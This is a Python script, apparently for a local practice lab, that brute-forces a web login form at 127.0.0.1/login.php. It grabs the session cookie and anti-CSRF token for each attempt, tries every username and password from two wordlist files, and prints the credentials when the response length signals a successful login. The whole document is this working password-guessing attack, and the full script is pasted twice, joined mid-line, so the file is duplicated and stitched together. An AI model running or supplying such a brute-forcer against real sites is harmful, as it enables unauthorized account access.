# -*- coding: utf-8 -*-
"""
Created on Sat Nov 24 20:42:01 2018
@author: 小谢
"""
import urllib
import requests
from bs4 import BeautifulSoup
##第一步，先访问 http://127.0.0.1/login.php页面，获得服务器返回的cookie和token
def get_cookie_token():
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Upgrade-Insecure-Requests':'1'}
    res=requests.get("http://127.0.0.1/login.php",headers=headers)
    cookies=res.cookies
    a=[(';'.join(['='.join(item)for item in cookies.items()]))]   ## a为列表，存储cookie和token
    html=res.text
    soup=BeautifulSoup(html,"html.parser")
    token=soup.form.contents[3]['value']
    a.append(token)
    return a

##第二步模拟登陆

def Login(a,username,password):    #a是包含了cookie和token的列表
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Content-Length':'88',
             'Content-Type':'application/x-www-form-urlencoded',
             'Upgrade-Insecure-Requests':'1',
             'Cookie':a[0],
             'Referer':'http://127.0.0.1/login.php'}
    values={'username':username,
            'password':password,
            'Login':'Login',
            'user_token':a[1]
        }
    data=urllib.parse.urlencode(values)
    resp=requests.post("http://127.0.0.1/login.php",data=data,headers=headers)
    return 
#重定向到index.php
def main():
    with open("user.txt",'r') as f:
        users=f.readlines()
        for user in users:
            user=user.strip("\n")                 #用户名
            with open("passwd.txt",'r') as file:
                passwds=file.readlines()
                for passwd in passwds:
                    passwd=passwd.strip("\n")   #密码
                    a=get_cookie_token()              ##a列表中存储了服务器返回的cookie和toke
                    Login(a,user,passwd)
                    headers={'Host':'127.0.0.1',
                              'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                              'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                              'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                              'Connection':'keep-alive',
                              'Upgrade-Insecure-Requests':'1',
                              'Cookie':a[0],
                              'Referer':'http://127.0.0.1/login.php'}
                    response=requests.get("http://127.0.0.1/index.php",headers=headers)
                    if response.headers['Content-Length']=='7524':    #如果登录成功
                       print("用户名为：%s ,密码为：%s"%(user,passwd))   #打印出用户名和密码
                       break
if __name__=='__main__':
    main()# -*- coding: utf-8 -*-
"""
Created on Sat Nov 24 20:42:01 2018
@author: 小谢
"""
import urllib
import requests
from bs4 import BeautifulSoup
##第一步，先访问 http://127.0.0.1/login.php页面，获得服务器返回的cookie和token
def get_cookie_token():
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Upgrade-Insecure-Requests':'1'}
    res=requests.get("http://127.0.0.1/login.php",headers=headers)
    cookies=res.cookies
    a=[(';'.join(['='.join(item)for item in cookies.items()]))]   ## a为列表，存储cookie和token
    html=res.text
    soup=BeautifulSoup(html,"html.parser")
    token=soup.form.contents[3]['value']
    a.append(token)
    return a

##第二步模拟登陆

def Login(a,username,password):    #a是包含了cookie和token的列表
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Content-Length':'88',
             'Content-Type':'application/x-www-form-urlencoded',
             'Upgrade-Insecure-Requests':'1',
             'Cookie':a[0],
             'Referer':'http://127.0.0.1/login.php'}
    values={'username':username,
            'password':password,
            'Login':'Login',
            'user_token':a[1]
        }
    data=urllib.parse.urlencode(values)
    resp=requests.post("http://127.0.0.1/login.php",data=data,headers=headers)
    return 
#重定向到index.php
def main():
    with open("user.txt",'r') as f:
        users=f.readlines()
        for user in users:
            user=user.strip("\n")                 #用户名
            with open("passwd.txt",'r') as file:
                passwds=file.readlines()
                for passwd in passwds:
                    passwd=passwd.strip("\n")   #密码
                    a=get_cookie_token()              ##a列表中存储了服务器返回的cookie和toke
                    Login(a,user,passwd)
                    headers={'Host':'127.0.0.1',
                              'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                              'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                              'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                              'Connection':'keep-alive',
                              'Upgrade-Insecure-Requests':'1',
                              'Cookie':a[0],
                              'Referer':'http://127.0.0.1/login.php'}
                    response=requests.get("http://127.0.0.1/index.php",headers=headers)
                    if response.headers['Content-Length']=='7524':    #如果登录成功
                       print("用户名为：%s ,密码为：%s"%(user,passwd))   #打印出用户名和密码
                       break
if __name__=='__main__':
    main()
